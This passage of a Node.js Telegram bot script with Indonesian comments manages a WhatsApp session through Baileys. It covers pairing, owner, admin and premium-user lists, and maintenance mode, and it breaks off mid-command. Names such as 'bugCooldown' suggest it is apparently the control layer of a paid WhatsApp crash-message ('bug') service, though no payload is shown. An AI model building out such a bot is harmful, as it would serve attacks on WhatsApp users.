const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const { BOT_TOKEN, allowedDevelopers } = require("./settings/config");
const tdxlol = fs.readFileSync('./lib/tdx.jpeg');
const crypto = require('crypto');
const o = fs.readFileSync(`./lib/o.jpg`)
// --- Inisialisasi Bot Telegram ---
const bot = new Telegraf(BOT_TOKEN);

// --- Variabel Global ---
let kipop = null;
let isWhatsAppConnected = false;
const usePairingCode = true; // Tidak digunakan dalam kode Anda
let maintenanceConfig = {
    maintenance_mode: false,
    message: "⛔ Maaf Script ini sedang di perbaiki oleh developer, mohon untuk menunggu hingga selesai !!"
};
let premiumUsers = {};
let adminList = [];
let ownerList = [];
let deviceList = [];
let userActivity = {};
let allowedBotTokens = [];
let ownerataubukan;
let adminataubukan;
let Premiumataubukan;
let reconnectAttempts = 0; // Pindahkan di luar fungsi startSesi()
const cooldowns = new Map();
const COOLDOWN_TIME = 1 * 1000; // 1 detik cooldown
// Tambahkan di bagian variabel global
const bugCooldowns = new Map(); // Untuk menyimpan cooldown tiap user
const DEFAULT_COOLDOWN = 60; // Default 60 detik
// --- Fungsi-fungsi Bantuan ---
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
// --- Fungsi untuk Mengecek Apakah User adalah Owner ---
const isOwner = (userId) => {
    if (ownerList.includes(userId.toString())) {
        ownerataubukan = "✅";
        return true;
    } else {
        ownerataubukan = "❌";
        return false;
    }
};

const OWNER_ID = (userId) => {
    if (allowedDevelopers.includes(userId.toString())) {
        ysudh = "✅";
        return true;
    } else {
        gnymbung = "❌";
        return false;
    }
};

// --- Fungsi untuk Mengecek Apakah User adalah Admin ---
const isAdmin = (userId) => {
    if (adminList.includes(userId.toString())) {
        adminataubukan = "✅";
        return true;
    } else {
        adminataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./lib/admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./lib/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

// --- Fungsi untuk Menambahkan User Premium ---
const addPremiumUser = (userId, durationDays) => {
    // Pastikan userId adalah string
    userId = userId.toString();
    
    const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
    premiumUsers[userId] = {
        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
    };
    savePremiumUsers();
};

// --- Fungsi untuk Menghapus User Premium ---
const removePremiumUser = (userId) => {
    delete premiumUsers[userId];
    savePremiumUsers();
};

// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

// --- Fungsi untuk Menyimpan Data User Premium ---
const savePremiumUsers = () => {
    fs.writeFileSync('./lib/premiumUsers.json', JSON.stringify(premiumUsers));
};

// --- Fungsi untuk Memuat Data User Premium ---
const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync('./lib/premiumUsers.json');
        premiumUsers = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat data user premium:'), error);
        premiumUsers = {};
    }
};

// --- Fungsi untuk Memuat Daftar Device ---
const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./ListDevice.json');
        deviceList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};

// --- Fungsi untuk Menyimpan Daftar Device ---
const saveDeviceList = () => {
    fs.writeFileSync('./ListDevice.json', JSON.stringify(deviceList));
};

// --- Fungsi untuk Menambahkan Device ke Daftar ---
const addDeviceToList = (userId, token) => {
    const deviceNumber = deviceList.length + 1;
    deviceList.push({
        number: deviceNumber,
        userId: userId,
        token: token
    });
    saveDeviceList();
    console.log(chalk.white.bold(`
╭──────────────────❍
┃ ${chalk.white.bold('DETECT NEW PERANGKAT')}
┃ ${chalk.white.bold('DEVICE NUMBER: ')} ${chalk.yellow.bold(deviceNumber)}
╰──────────────────❍`));
};

// --- Fungsi untuk Mencatat Aktivitas Pengguna ---
const recordUserActivity = (userId, userNickname) => {
    const now = moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss');
    userActivity[userId] = {
        nickname: userNickname,
        last_seen: now
    };

    // Menyimpan aktivitas pengguna ke file
    fs.writeFileSync('./userActivity.json', JSON.stringify(userActivity));
};

// --- Fungsi untuk Memuat Aktivitas Pengguna ---
const loadUserActivity = () => {
    try {
        const data = fs.readFileSync('./userActivity.json');
        userActivity = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat aktivitas pengguna:'), error);
        userActivity = {};
    }
};

// --- Middleware untuk Mengecek Mode Maintenance ---
const checkMaintenance = async (ctx, next) => {
    let userId, userNickname;

    if (ctx.from) {
        userId = ctx.from.id.toString();
        userNickname = ctx.from.first_name || userId;
    } else if (ctx.update.channel_post && ctx.update.channel_post.sender_chat) {
        userId = ctx.update.channel_post.sender_chat.id.toString();
        userNickname = ctx.update.channel_post.sender_chat.title || userId;
    }

    // Catat aktivitas hanya jika userId tersedia
    if (userId) {
        recordUserActivity(userId, userNickname);
    }

    if (maintenanceConfig.maintenance_mode && !OWNER_ID(ctx.from.id)) {
        // Jika mode maintenance aktif DAN user bukan developer:
        // Kirim pesan maintenance dan hentikan eksekusi middleware
        console.log("Pesan Maintenance:", maintenanceConfig.message);
        const escapedMessage = maintenanceConfig.message.replace(/\*/g, '\\*'); // Escape karakter khusus
        return await ctx.replyWithMarkdown(escapedMessage);
    } else {
        // Jika mode maintenance tidak aktif ATAU user adalah developer:
        // Lanjutkan ke middleware/handler selanjutnya
        await next();
    }
};

// --- Middleware untuk Mengecek Status Premium ---
const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("❌ Maaf... anda harus meminta premium ke pemilik Bot 👍.");
    }
};


// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
      version,
      keepAliveIntervalMs: 30000,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }), 
      auth: state,
      browser: ['Mac OS', 'Safari', '10.15.7'],
      getMessage: async (key) => ({
          conversation: 'P', 
      }),
  };

  kipop = makeWASocket(connectionOptions);

  kipop.ev.on('creds.update', saveCreds);
  store.bind(kipop.ev);

  kipop.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;
    const MAX_RECONNECT_ATTEMPTS = 3;
 
    const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
 
    if (connection === 'open') {
        isWhatsAppConnected = true;
        reconnectAttempts = 0;
        console.log(chalk.white.bold(`
╭──「 𝗦𝗧𝗔𝗧𝗨𝗦  」
┃  ${chalk.green.bold('WHATSAPP CONNECTED')}
╰─────────────────❍`));
    }
 
    if (connection === 'close') {
        isWhatsAppConnected = false;
        
        // Cek jika terdeteksi logout
        if (lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut) {
            console.log(chalk.red.bold(`
╭─────────────────❍
┃ 🚫 WHATSAPP LOGGED OUT
╰─────────────────❍`));
 
            // Kirim notifikasi ke owner
            for (const ownerId of allowedDevelopers) {
                try {
                    await bot.telegram.sendMessage(ownerId, `
╭──「 𝗦𝗧𝗔𝗧𝗨𝗦  」
┃ • STATUS: TERDETEKSI LOGOUT 🚫
┃ • Waktu: ${moment().tz('Asia/Jakarta').format('DD/MM/YY HH:mm:ss')} WIB
╰─────────────────❍`, {
                        parse_mode: "Markdown",
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "❌ Close", callback_data: "close" }]
                            ]
                        }
                    });
                } catch (notifError) {
                    console.error(chalk.red.bold(`Gagal mengirim notifikasi ke owner ${ownerId}:`, notifError));
                }
            }
 
            // Hapus file session
            const sessionPath = './session';
            try {
                fs.rmSync(sessionPath, { recursive: true, force: true });
                console.log(chalk.yellow.bold(`
╭─────────────────❍
┃ ALL FILE BERHASIL DI DELETE ✅
╰─────────────────❍`));
            } catch (error) {
                console.error(chalk.red.bold(`
╭─────────────────❍
┃ ❌ GAGAL MENGHAPUS SESION
┃ EROR: ${error.message}
╰─────────────────❍`));
            }
 
            kipop = null;
            reconnectAttempts = 0;
            return; // Stop reconnection attempts
        }
 
        // Handle reconnection for non-logout disconnects
        if (shouldReconnect) {
            reconnectAttempts++;
 
            console.log(
                chalk.white.bold(`
╭─────────────────❍
┃   ${chalk.red.bold('WHATSAPP DISCONNECTED')}
┃   Percobaan Reconnect: ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS}
╰─────────────────❍`)
            );
 
            if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
                console.log(chalk.red.bold(`
╭─────────────────❍
┃ NOMOR WHATSAPP BANNED 🚫 
╰─────────────────❍`));
 
                // Kirim notifikasi ke owner
                for (const ownerId of allowedDevelopers) {
                    try {
                        await bot.telegram.sendMessage(ownerId, `
╭──「 𝗦𝗧𝗔𝗧𝗨𝗦  」
┃ • STATUS: TERDETEKSI BANNED 🚫 
┃ • Waktu: ${moment().tz('Asia/Jakarta').format('DD/MM/YY HH:mm:ss')} WIB
┃ • Percobaan: ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS}
╰─────────────────❍`, {
                            parse_mode: "Markdown",
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: "❌ Close", callback_data: "close" }]
                                ]
                            }
                        });
                    } catch (notifError) {
                        console.error(chalk.red.bold(`Gagal mengirim notifikasi ke owner ${ownerId}:`, notifError));
                    }
                }
 
                // Hapus file session
                const sessionPath = './session';
                try {
                    fs.rmSync(sessionPath, { recursive: true, force: true });
                    console.log(chalk.yellow.bold(`
╭─────────────────❍
┃ ALL FILE BERHASIL DI DELETE ✅
╰─────────────────❍`));
                } catch (error) {
                    console.error(chalk.red.bold(`
╭─────────────────❍
┃ ❌ GAGAL MENGHAPUS SESION
┃ EROR: ${error.message}
╰─────────────────❍`));
                }
 
                isWhatsAppConnected = false;
                kipop = null;
                reconnectAttempts = 0;
            } else {
                setTimeout(() => {
                    startSesi();
                }, 5000);
            }
        } else {
            console.log(
                chalk.white.bold(`
╭─────────────────❍
┃   ${chalk.red.bold('WHATSAPP LOGGED OUT')}
╰─────────────────❍`)
            );
            
            // Hapus session ketika logout
            const sessionPath = './session';
            try {
                fs.rmSync(sessionPath, { recursive: true, force: true });
                console.log(chalk.yellow.bold(`
╭─────────────────❍
┃ ALL FILE BERHASIL DI DELETE ✅
╰─────────────────❍`));
            } catch (error) {
                console.error(chalk.red.bold(`
╭─────────────────❍
┃ ❌ GAGAL MENGHAPUS SESION
┃ EROR: ${error.message}
╰─────────────────❍`));
            }
            
            isWhatsAppConnected = false;
            kipop = null;
            reconnectAttempts = 0;
        }
    }
  });
}

(async () => {
  console.log(chalk.red.bold(`  
👑 ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴋɪᴘᴏᴘ ʟᴇᴄʏ👑 `));

  // Validasi BOT_TOKEN
  if (!BOT_TOKEN || BOT_TOKEN === '' || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
      console.log(chalk.red.bold(`
╭═══════════════════════════════════════❍
┃ Bot Token Tidak ditemukan atau tidak  ┃
┃ benar di Bagian file config.js               ┃
┃ Silakan Buat BOT_TOKEN di @BotFather        ┃
╰═══════════════════════════════════════❍`));
      process.exit(1); // Hentikan program jika token tidak valid
  }

  console.log(chalk.white.bold(`
╭──「 𝗦𝗧𝗔𝗧𝗨𝗦  」
┃ ${chalk.cyanBright.bold('LOADING DATABASE')}
╰─────────────────❍`));

  try {
      loadPremiumUsers();
      loadAdmins();
      loadDeviceList();
      loadUserActivity();
      
      startSesi();

      // Menambahkan device ke ListDevice.json saat inisialisasi
      addDeviceToList(BOT_TOKEN, BOT_TOKEN);
      
      console.log(chalk.white.bold(`
╭──「 𝗦𝗧𝗔𝗧𝗨𝗦  」
┃ ${chalk.greenBright.bold('SYSTEM READY !!')}
╰─────────────────❍`));
  } catch (error) {
      console.error(chalk.red.bold(`
╭═══════════════════════════════════════❍
┃ Terjadi kesalahan saat analisis:  ┃
┃ ${error.message}
╰═══════════════════════════════════════❍`));
      process.exit(1);
  }
})();
// Ganti dengan token GitHub yang kamu punya (jaga kerahasiaannya)


// Command untuk pairing WhatsApp
// Command handler untuk addpairing
bot.command("connect", async (ctx) => {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
      return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
  }

  // Cek jika WhatsApp sudah terhubung
  if (kipop && kipop.user) {
      const connectedMessage = `
╭──「 𝗦𝗧𝗔𝗧𝗨𝗦 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 」  
┃ ✅ ᴡʜᴀᴛsᴀᴘᴘ sᴜᴅᴀʜ ᴛᴇʀʜᴜʙᴜɴɢ ᴅᴇɴɢᴀɴ ʙᴏᴛ
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗣𝗲𝗿𝗮𝗻𝗴𝗸𝗮𝘁 𝗡𝗼𝗺𝗼𝗿 :
┃ • Nama: ${kipop.user.name || 'Tidak diketahui'}
┃ • Nomor: ${kipop.user.id.split(':')[0]}
┃ • Platform: ${kipop.user.platform || 'WhatsApp'}
╰─────────────────`;
      
      return await ctx.reply(connectedMessage, {
          parse_mode: "Markdown",
          reply_markup: {
              inline_keyboard: [
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });
  }

  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
      return await ctx.reply("❌ Format perintah salah. Gunakan: /connect <nomor_wa>");
  }

  let phoneNumber = args[1];
  // Hapus semua karakter non-digit
  phoneNumber = phoneNumber.replace(/[^0-9]/g, '');

  // Validasi panjang nomor minimal
  if (phoneNumber.length < 8) {
      return await ctx.reply("❌ Nomor telepon tidak valid. Minimal 8 digit.");
  }

  // Fungsi untuk mengecek dan menambahkan prefix negara
  const addCountryCode = (number) => {
      // Jika nomor sudah memiliki kode negara, biarkan apa adanya
      if (number.match(/^(1|7|20|27|30|31|32|33|34|36|39|40|41|43|44|45|46|47|48|49|51|52|53|54|55|56|57|58|60|61|62|63|64|65|66|81|82|84|86|90|91|92|93|94|95|98|212|213|216|218|220|221|222|223|224|225|226|227|228|229|230|231|232|233|234|235|236|237|238|239|240|241|242|243|244|245|246|247|248|249|250|251|252|253|254|255|256|257|258|260|261|262|263|264|265|266|267|268|269|290|291|297|298|299|350|351|352|353|354|355|356|357|358|359|370|371|372|373|374|375|376|377|378|379|380|381|382|383|385|386|387|389|420|421|423|500|501|502|503|504|505|506|507|508|509|590|591|592|593|594|595|596|597|598|599|670|672|673|674|675|676|677|678|679|680|681|682|683|685|686|687|688|689|690|691|692|850|852|853|855|856|872|880|886|960|961|962|963|964|965|966|967|968|970|971|972|973|974|975|976|977|992|993|994|995|996|998)/)) {
        return number;
    }
      // Jika tidak ada kode negara, tambahkan 62 (Indonesia)
      return '62' + number;
  };

  phoneNumber = addCountryCode(phoneNumber);

  // Tambahkan pengecekan eksplisit untuk kipop
  if (!kipop) {
      try {
          await startSesi();
          await new Promise(resolve => setTimeout(resolve, 5000));
      } catch (initError) {
          console.error('Gagal menginisialisasi WhatsApp:', initError);
          return await ctx.reply("❌ Gagal menginisialisasi koneksi WhatsApp. Silakan coba lagi.");
      }
  }

  if (!kipop || !kipop.requestPairingCode) {
      return await ctx.reply("❌ Koneksi WhatsApp belum siap. Silakan coba lagi dalam beberapa saat.");
  }

  try {
      const code = await kipop.requestPairingCode(phoneNumber);
      const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

      await ctx.replyWithPhoto("https://files.catbox.moe/kzk3dp.jpg", {
          caption: `
╭──「  𝗣𝗔𝗜𝗥𝗜𝗡𝗚 𝗖𝗢𝗗𝗘  」 
┃ 𝗡𝗼𝗺𝗼𝗿: ${phoneNumber}
┃ 𝗞𝗼𝗱𝗲: \`${formattedCode}\`
╰─────────────────❍`,
          parse_mode: "Markdown",
          reply_markup: {
              inline_keyboard: [
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });
  } catch (error) {
      console.error(chalk.red('Gagal melakukan pairing:'), error);
      await ctx.reply("❌ Gagal melakukan pairing. Pastikan WhatsApp sudah terhubung dan nomor valid.");
  }
});

// Handler untuk gencode callback query
bot.action(/gencode_(.+)/, async (ctx) => {
  try {
      const phoneNumber = ctx.match[1];
      
      // Tampilkan status loading (gunakan callback.answer sebagai gantinya)
      await ctx.callback.answer("Generating new code..."); 
      
      if (kipop && kipop.user) {
          return await ctx.editMessageCaption("ℹ️ WhatsApp sudah terhubung. Tidak perlu pairing lagi.", {
              reply_markup: {
                  inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]]
              }
          });
      }

      const code = await kipop.requestPairingCode(phoneNumber);
      const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

      await ctx.editMessageCaption(
          `
╭──「  𝗣𝗔𝗜𝗥𝗜𝗡𝗚 𝗖𝗢𝗗𝗘  」
┃ 𝗡𝗼𝗺𝗼𝗿: ${phoneNumber}
┃ 𝗞𝗼𝗱𝗲: \`${formattedCode}\`
╰─────────────────❍`, {
          parse_mode: "Markdown",
          reply_markup: {
              inline_keyboard: [
                  [{ text: "🔄 Generate New Code", callback_data: `gencode_${phoneNumber}` }],
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });

  } catch (error) {
      console.error('Error generating new code:', error);
      // Gunakan callback.answer untuk error juga
      await ctx.callback.answer("❌ Gagal generate kode baru. Silakan coba lagi."); 
  }
});

// Handler untuk tombol close
bot.action("close", async (ctx) => {
  try {
      await ctx.deleteMessage();
  } catch (error) {
      console.error(chalk.red('Gagal menghapus pesan:'), error);
  }
});

// Command /addowner - Menambahkan owner baru
bot.command("addowner", async (ctx) => {
  if (!OWNER_ID(ctx.from.id)) {
      return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
  }

  let userId;
  
  // Cek jika command merupakan reply ke pesan
  if (ctx.message.reply_to_message) {
      userId = ctx.message.reply_to_message.from.id.toString();
  } 
  // Cek jika ada username/mention atau ID yang diberikan
  else {
      const args = ctx.message.text.split(" ")[1];
      
      if (!args) {
          return await ctx.reply(`
┏━━━❰ Tutorial Addowner ❱━━━
┣⟣ Format tidak valid!
┣⟣ Contoh: /addowner <user_id> <Durasi>
┣⟣ Durasi: 
┃  • 30d (30 hari)
┃  • 24h (24 jam)
┃  • 1m (1 bulan)
┗━━━━━━━━━━━━━━━`);
      }

      // Jika input adalah username (dimulai dengan @)
      if (args.startsWith("@")) {
          try {
              const username = args.slice(1); // Hapus @ dari username
              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
              userId = chatMember.user.id.toString();
          } catch (error) {
              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
          }
      } 
      // Jika input adalah ID langsung
      else {
          if (!/^\d+$/.test(args)) {
              return await ctx.reply("❌ ID harus berupa angka!");
          }
          userId = args;
      }
  }

  // Cek apakah user sudah terdaftar sebagai owner
  if (ownerList.includes(userId)) {
      return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai owner.`);
  }

  try {
      // Dapatkan info user untuk ditampilkan
      const user = await ctx.telegram.getChat(userId);
      ownerList.push(userId);
      await saveOwnerList();

      const successMessage = `
╭──「 𝗔𝗗𝗗 𝗢𝗪𝗡𝗘𝗥 」
┃ ✅ BERHASIL MENAMBAH OWNER 
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗢𝘄𝗻𝗲𝗿:
┃ • ID: ${userId}
┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
╰─────────────────`;

      await ctx.replyWithMarkdown(successMessage, {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });

  } catch (error) {
      console.error('Error adding owner:', error);
      await ctx.reply("❌ Gagal menambahkan owner. Pastikan ID/Username valid dan bot memiliki akses yang diperlukan.");
  }
});

bot.command("setjeda", async (ctx) => {
  // Permission check
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
      return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
  }

  const args = ctx.message.text.split(/\s+/);
  if (args.length < 2 || isNaN(args[1])) {
      return await ctx.reply(`
╭❌ Format perintah salah. Gunakan: /setjeda <detik>`);
  }

  const newCooldown = parseInt(args[1]);
  
  // Validasi input
  if (newCooldown < 10 || newCooldown > 3600) {
      return await ctx.reply("❌ Jeda harus antara 10 - 3600 detik!");
  }

  bugCooldown = newCooldown;
  await ctx.reply(`
╭──「 𝗦𝗘𝗧 𝗝𝗘𝗗𝗔 」
│ • Status: Berhasil ✅
│ • Jeda: ${bugCooldown} detik
╰──────────────────❍`);
});

// Command /addadmin - Menambahkan admin baru
bot.command("addadmin", async (ctx) => {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
      return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
  }

  let userId;
  
  // Cek jika command merupakan reply ke pesan
  if (ctx.message.reply_to_message) {
      userId = ctx.message.reply_to_message.from.id.toString();
  } 
  // Cek jika ada username/mention atau ID yang diberikan
  else {
      const args = ctx.message.text.split(" ")[1];
      
      if (!args) {
        return await ctx.reply(`
┏━━━❰ Tutorial Addowner ❱━━━
┣⟣ Format tidak valid!
┣⟣ Contoh: /addowner <user_id> <Durasi>
┣⟣ Durasi: 
┃  • 30d (30 hari)
┃  • 24h (24 jam)
┃  • 1m (1 bulan)
┗━━━━━━━━━━━━━━━`);
      }

      // Jika input adalah username (dimulai dengan @)
      if (args.startsWith("@")) {
          try {
              const username = args.slice(1); // Hapus @ dari username
              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
              userId = chatMember.user.id.toString();
          } catch (error) {
              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
          }
      } 
      // Jika input adalah ID langsung
      else {
          if (!/^\d+$/.test(args)) {
              return await ctx.reply("❌ ID harus berupa angka!");
          }
          userId = args;
      }
  }

  // Cek apakah user sudah terdaftar sebagai admin
  if (adminList.includes(userId)) {
      return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai admin.`);
  }

  try {
      // Dapatkan info user untuk ditampilkan
      const user = await ctx.telegram.getChat(userId);
      addAdmin(userId);

      const successMessage = `
╭──「 𝗔𝗗𝗗 𝗔𝗗𝗠𝗜𝗡  」
┃ ✅ BERHASIL MENAMBAH ADMIN
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗔𝗱𝗺𝗶𝗻:
┃ • ID: ${userId}
┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
╰─────────────────`;

      await ctx.replyWithMarkdown(successMessage, {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });

  } catch (error) {
      console.error('Error adding admin:', error);
      await ctx.reply("❌ Gagal menambahkan admin. Pastikan ID/Username valid dan bot memiliki akses yang diperlukan.");
  }
});

// Delete Premium Command
bot.command("delprem", async (ctx) => {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
      return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
  }

  let userId;

  // Cek jika command merupakan reply ke pesan
  if (ctx.message.reply_to_message) {
      userId = ctx.message.reply_to_message.from.id.toString();
  } else {
      const args = ctx.message.text.split(" ")[1];
      if (!args) {
          return await ctx.reply(`❌ Format perintah salah. Gunakan: /delprem <id>`);
      }

      // Jika input adalah username
      if (args.startsWith("@")) {
          try {
              const username = args.slice(1);
              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
              userId = chatMember.user.id.toString();
          } catch (error) {
              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
          }
      } else {
          if (!/^\d+$/.test(args)) {
              return await ctx.reply("❌ ID harus berupa angka!");
          }
          userId = args;
      }
  }

  // Cek apakah user adalah premium
  if (!premiumUsers[userId]) {
      return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
  }

  try {
      const user = await ctx.telegram.getChat(userId);
      removePremiumUser(userId);

      const successMessage = `
╭──「  𝗗𝗘𝗟𝗘𝗧𝗘 𝗣𝗥𝗘𝗠 」
┃ ✅ BERHASIL MENGHAPUS PREM
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗨𝘀𝗲𝗿:
┃ • ID: ${userId}
┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
╰─────────────────`;

      await ctx.replyWithMarkdown(successMessage, {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });
  } catch (error) {
      console.error('Error removing premium:', error);
      await ctx.reply("❌ Gagal menghapus premium. Pastikan ID/Username valid.");
  }
});

// Delete Admin Command
bot.command("deladmin", async (ctx) => {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
      return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
  }

  let userId;

  if (ctx.message.reply_to_message) {
      userId = ctx.message.reply_to_message.from.id.toString();
  } else {
      const args = ctx.message.text.split(" ")[1];
      if (!args) {
          return await ctx.reply(`❌ Format perintah salah. Gunakan: /deladmin <id>`);
      }

      if (args.startsWith("@")) {
          try {
              const username = args.slice(1);
              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
              userId = chatMember.user.id.toString();
          } catch (error) {
              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
          }
      } else {
          if (!/^\d+$/.test(args)) {
              return await ctx.reply("❌ ID harus berupa angka!");
          }
          userId = args;
      }
  }

  if (!adminList.includes(userId)) {
      return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai admin.`);
  }

  try {
      const user = await ctx.telegram.getChat(userId);
      removeAdmin(userId);

      const successMessage = `
╭──「  𝗗𝗘𝗟𝗘𝗧𝗘 𝗔𝗗𝗠𝗜𝗡 」
┃ ✅ BERHASIL MENGHAPUS ADMIN
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗨𝘀𝗲𝗿:
┃ • ID: ${userId}
┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
╰─────────────────`;

      await ctx.replyWithMarkdown(successMessage, {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });
  } catch (error) {
      console.error('Error removing admin:', error);
      await ctx.reply("❌ Gagal menghapus admin. Pastikan ID/Username valid.");
  }
});

// Delete Owner Command
bot.command("delowner", async (ctx) => {
  if (!OWNER_ID(ctx.from.id)) {
